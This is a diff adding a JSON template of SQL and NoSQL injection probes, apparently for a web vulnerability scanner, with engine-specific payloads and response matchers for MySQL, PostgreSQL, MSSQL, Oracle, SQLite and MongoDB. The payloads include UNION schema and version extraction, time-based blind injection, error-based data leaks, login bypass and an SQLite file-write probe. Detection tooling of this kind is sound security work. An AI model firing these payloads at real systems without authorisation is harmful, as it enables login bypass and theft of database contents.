@@ -1,0 +1,614 @@
+{
+  "category": "sqli_engines",
+  "description": " \u2014 engine-specific payloads (MySQL, PostgreSQL, MSSQL, Oracle, SQLite, NoSQL)",
+  "contexts": {
+    "mysql": {
+      "description": "SQL injection probes targeting MySQL via Apache/PHP/Nginx stacks",
+      "tech_match": [
+        "Apache",
+        "PHP",
+        "MySQL",
+        "Nginx"
+      ],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger MySQL syntax error",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "sql syntax",
+                "mysql",
+                "warning:"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND SLEEP({{sleep}})--",
+          "description": "MySQL time-based blind injection via SLEEP",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4000
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT NULL,NULL,NULL--",
+          "description": "MySQL UNION-based column count probe",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 200
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 40,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=2 UNION SELECT 1,version(),3--",
+          "description": "MySQL version extraction via UNION \u2014 look for MySQL/MariaDB version pattern in response body delta",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 5
+            },
+            {
+              "type": "regex",
+              "pattern": "\\b[0-9]+\\.[0-9]+\\.[0-9]+-?(MariaDB|ubuntu|log|debian|cll)?"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' OR '1'='1",
+          "description": "Classic MySQL OR 1=1 authentication bypass",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 200
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 35,
+          "variables": {}
+        }
+      ]
+    },
+    "postgresql": {
+      "description": "SQL injection probes targeting PostgreSQL",
+      "tech_match": [
+        "PostgreSQL"
+      ],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger PostgreSQL syntax error",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "pg_query",
+                "unterminated",
+                "syntax error"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; SELECT pg_sleep({{sleep}})--",
+          "description": "PostgreSQL time-based blind injection via pg_sleep",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4000
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=CAST('a' AS integer)--",
+          "description": "PostgreSQL error-based injection via invalid CAST",
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "invalid input syntax",
+                "integer"
+              ],
+              "condition": "and"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}' AND 1=1--",
+          "description": "PostgreSQL boolean-based true condition \u2014 baseline-like response with no error confirms query parsing; pair with AND 1=2 for differential confirmation",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "not_word",
+              "words": [
+                "error",
+                "exception",
+                "syntax"
+              ]
+            }
+          ],
+          "severity": "info",
+          "confidence_boost": 10,
+          "variables": {}
+        }
+      ]
+    },
+    "mssql": {
+      "description": "SQL injection probes targeting Microsoft SQL Server via IIS/ASP.NET stacks",
+      "tech_match": [
+        "IIS",
+        "ASP.NET",
+        "MSSQL"
+      ],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger MSSQL syntax error",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "unclosed quotation",
+                "incorrect syntax",
+                "ole db"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; WAITFOR DELAY '0:0:{{sleep}}'--",
+          "description": "MSSQL time-based blind injection via WAITFOR DELAY",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4000
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--",
+          "description": "MSSQL error-based injection via CONVERT type mismatch",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "conversion failed",
+                "microsoft sql"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; SELECT 1--",
+          "description": "Stacked query probe for MSSQL",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "incorrect syntax",
+                "ole db",
+                "sql server"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 30,
+          "variables": {}
+        }
+      ]
+    },
+    "oracle": {
+      "description": "SQL injection probes targeting Oracle Database",
+      "tech_match": [
+        "Oracle",
+        "Java",
+        "WebLogic",
+        "OracleDB"
+      ],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger Oracle ORA- syntax error",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "ORA-",
+                "oracle",
+                "TNS:",
+                "PLS-"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))--",
+          "description": "Oracle error-based injection via CTXSYS.DRITHSX.SN -- leaks Oracle version in error message",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "DRG-",
+                "ORA-",
+                "Oracle Database"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))--",
+          "description": "Oracle error-based via UTL_INADDR -- DNS resolution error leaks query output",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "ORA-29257",
+                "ORA-06512",
+                "host not found"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}; SELECT CASE WHEN (1=1) THEN 'a'||dbms_pipe.receive_message(('a'),{{sleep}}) ELSE NULL END FROM dual--",
+          "description": "Oracle time-based blind injection via DBMS_PIPE.RECEIVE_MESSAGE",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 4000
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "sqlite": {
+      "description": "SQL injection probes targeting SQLite -- commonly found in embedded systems, mobile backends, and lightweight web apps",
+      "tech_match": [
+        "SQLite",
+        "Python",
+        "Flask",
+        "Django",
+        "PHP"
+      ],
+      "param_match": [
+        "id",
+        "uid",
+        "pid",
+        "num",
+        "page",
+        "idx",
+        "index",
+        "cat",
+        "item_id",
+        "user_id",
+        "order_id"
+      ],
+      "probes": [
+        {
+          "payload": "{{baseline}}'",
+          "description": "Quote break to trigger SQLite syntax error",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "sqlite",
+                "SQLITE_ERROR",
+                "unrecognized token",
+                "near \""
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT sqlite_version(),NULL,NULL-- -",
+          "description": "SQLite version extraction via UNION -- confirms SQLite backend and injection",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "regex",
+              "pattern": "3\\.[0-9]+\\.[0-9]+"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}} UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE type='table'-- -",
+          "description": "SQLite schema extraction via sqlite_master -- dumps CREATE TABLE statements",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "CREATE TABLE",
+                "CREATE INDEX"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 70,
+          "variables": {}
+        },
+        {
+          "payload": "{{baseline}}'; ATTACH DATABASE '/tmp/swk_probe.db' AS swk-- -",
+          "description": "SQLite ATTACH DATABASE probe -- tests for file write capability (detection only, writes to tmp)",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200,
+                500
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "not authorized",
+                "readonly",
+                "ATTACH"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
+    },
+    "nosql": {
+      "description": "NoSQL injection probes targeting MongoDB \u2014 operator injection for auth bypass and blind timing attacks",
+      "tech_match": [
+        "MongoDB",
+        "Express",
+        "Node.js",
+        "Mongoose"
+      ],
+      "param_match": [
+        "username",
+        "password",
+        "email",
+        "login",
+        "user",
+        "filter"
+      ],
+      "probes": [
+        {
+          "payload": "{\"$ne\":\"\"}",
+          "description": "MongoDB $ne operator injection \u2014 bypasses login by matching all documents where field is not empty; length/word-count diff from baseline indicates data leakage",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            },
+            {
+              "type": "word_count_diff",
+              "min_diff": 5
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$gt\":\"\"}",
+          "description": "MongoDB $gt operator injection \u2014 matches all documents where field is greater than empty string; response size increase indicates auth bypass",
+          "matchers": [
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            },
+            {
+              "type": "word_count_diff",
+              "min_diff": 5
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        },
+        {
+          "payload": "{\"$where\":\"sleep(5000)\"}",
+          "description": "MongoDB $where time-based blind injection \u2014 server-side JavaScript execution via sleep confirms injection",
+          "matchers": [
+            {
+              "type": "timing",
+              "min_ms": 5000
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
